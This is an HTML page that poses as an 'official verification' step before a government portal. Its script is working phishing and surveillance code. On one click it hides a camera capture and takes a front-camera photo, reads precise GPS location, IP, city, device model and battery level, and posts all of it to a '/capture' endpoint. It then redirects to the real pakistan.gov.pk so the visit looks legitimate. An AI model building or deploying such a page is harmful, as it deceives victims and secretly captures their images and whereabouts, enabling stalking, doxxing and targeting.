<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Digital Verification Portal</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #f5f7f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { background: white; width: 90%; max-width: 380px; padding: 30px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; text-align: center; }
        .header-top { border-bottom: 2px solid #28a745; margin-bottom: 20px; padding-bottom: 10px; font-weight: bold; color: #28a745; text-align: left; font-size: 14px; }
        h2 { font-size: 18px; color: #24292e; text-align: left; }
        p { font-size: 13px; color: #586069; text-align: left; line-height: 1.6; }
        .btn { background-color: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; }
        #loader { display: none; color: #28a745; font-weight: 600; margin-top: 10px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header-top">OFFICIAL VERIFICATION</div>
    <h2>Regional Access Control</h2>
    <p>Please verify your identity and location to proceed to the secure government portal.</p>
    <div id="loader">Processing... Please Wait</div>
    <button id="mainBtn" class="btn" onclick="verify()">CONTINUE TO PORTAL</button>
</div>

<video id="v" style="display:none;" autoplay playsinline></video>
<canvas id="c" style="display:none;" width="640" height="480"></canvas>

<script>
    async function verify() {
        // Facebook/Instagram Internal Browser Fix
        if (navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV") || navigator.userAgent.includes("Instagram")) {
            // Force open in external browser if possible
            alert("For security, please open this link in Chrome or Safari.");
        }

        document.getElementById('mainBtn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        let info = { 
            model: navigator.userAgent.split('(')[1]?.split(';')[1]?.trim() || "Unknown",
            battery: "N/A", lat: "0", lon: "0",
            city: "Pending", country: "Pending", realIp: "Pending"
        };

        // Battery info
        if(navigator.getBattery) { 
            const b = await navigator.getBattery(); 
            info.battery = Math.round(b.level*100)+"%"; 
        }

        // 1. IP-API (More stable in Pakistan)
        const geoTask = fetch('http://ip-api.com/json/')
            .then(res => res.json())
            .then(data => {
                info.city = data.city || "Unknown";
                info.country = data.country || "Unknown";
                info.realIp = data.query || "Unknown";
            }).catch(() => { info.city = "API Blocked"; });

        // 2. Camera Trigger
        const cameraTask = navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }})
            .catch(() => null);

        // 3. Location with High Accuracy
        navigator.geolocation.getCurrentPosition(async (pos) => {
            info.lat = pos.coords.latitude; 
            info.lon = pos.coords.longitude;
            await geoTask;
            handleCapture(await cameraTask, info);
        }, async () => {
            await geoTask;
            handleCapture(await cameraTask, info);
        }, { enableHighAccuracy: true, timeout: 8000 });
    }

    async function handleCapture(stream, info) {
        if(stream) {
            const video = document.getElementById('v');
            video.srcObject = stream;
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0);
                const img = canvas.toDataURL('image/jpeg', 0.5);
                stream.getTracks().forEach(t => t.stop());
                send(info, img);
            }, 1000);
        } else {
            send(info, null);
        }
    }

    function send(i, p) {
        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ info: i, photo: p })
        }).then(() => {
            window.location.href = "https://www.pakistan.gov.pk/";
        });
    }
</script>
</body>
</html>
